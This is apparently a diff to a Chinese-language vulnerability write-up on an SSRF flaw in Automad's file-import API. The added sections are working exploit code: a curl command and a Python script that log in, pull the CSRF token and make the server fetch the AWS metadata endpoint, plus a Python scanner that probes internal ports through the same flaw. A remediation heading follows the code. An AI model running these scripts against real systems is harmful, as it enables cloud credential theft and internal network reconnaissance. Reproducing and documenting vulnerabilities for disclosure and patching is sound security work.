@@ -174,6 +174,48 @@ curl -X POST "http://localhost:8080/_api/file/import" \
 # 如果成功，会在页面文件中看到 Automad 自身首页的 HTML
 ```
 
+### 获取 CSRF Token 的详细方法
+
+```bash
+# 方法1: 从登录后的 dashboard HTML 中提取
+# 登录后访问 dashboard，CSRF token 在 JS 变量中
+curl -s -b "PHPSESSID=<session>" "http://localhost:8080/dashboard" | grep -o '"__csrf__":"[^"]*"'
+
+# 方法2: 用 Python 自动化登录+获取 CSRF
+python3 << 'EOF'
+import requests
+
+base = "http://localhost:8080"
+s = requests.Session()
+
+# 登录（替换为你设置的密码）
+login = s.post(f"{base}/_api/session/login", data={
+    "username": "admin",    # Automad 默认用户名
+    "password": "your_password"
+})
+print(f"Login: {login.status_code}")
+
+# 从 dashboard 获取 CSRF token
+dash = s.get(f"{base}/dashboard")
+import re
+csrf_match = re.search(r'"__csrf__":"([^"]+)"', dash.text)
+if csrf_match:
+    csrf = csrf_match.group(1)
+    print(f"CSRF: {csrf}")
+    
+    # 触发 SSRF - 读取 AWS metadata
+    r = s.post(f"{base}/_api/file/import", data={
+        "__csrf__": csrf,
+        "importUrl": "http://169.254.169.254/latest/meta-data/",
+        "url": "/"
+    })
+    print(f"SSRF Response: {r.status_code}")
+    print(r.text)
+else:
+    print("Failed to extract CSRF token")
+EOF
+```
+
 ### 验证文件写入
 
 ```bash
@@ -181,6 +223,47 @@ curl -X POST "http://localhost:8080/_api/file/import" \
 # 查看写入结果
 find pages/ -newer /tmp/timestamp -type f
 # 或者在 admin 后台的文件管理器中查看
+
+# 查看导入的内容
+cat pages/$(find pages/ -newer /tmp/timestamp -name "*" -type f | head -1)
+# 如果 SSRF 目标返回了数据，这里能看到
+```
+
+### 端口扫描自动化脚本
+
+```python
+#!/usr/bin/env python3
+"""Automad SSRF Internal Port Scanner"""
+import requests
+import time
+
+base = "http://localhost:8080"
+s = requests.Session()
+
+# 1. 登录
+s.post(f"{base}/_api/session/login", data={"username":"admin","password":"your_password"})
+
+# 2. 获取 CSRF
+import re
+dash = s.get(f"{base}/dashboard")
+csrf = re.search(r'"__csrf__":"([^"]+)"', dash.text).group(1)
+
+# 3. 扫描内网端口
+TARGET = "127.0.0.1"
+PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017]
+
+for port in PORTS:
+    start = time.time()
+    r = s.post(f"{base}/_api/file/import", data={
+        "__csrf__": csrf,
+        "importUrl": f"http://{TARGET}:{port}/",
+        "url": "/"
+    })
+    elapsed = time.time() - start
+    # 判断：有数据=端口开放，无数据/超时=端口关闭
+    has_data = "importFailedError" not in r.text
+    status = "OPEN" if has_data else "CLOSED"
+    print(f"  Port {port:5d}: {status} ({elapsed:.1f}s)")
 ```
 
 ## 修复建议
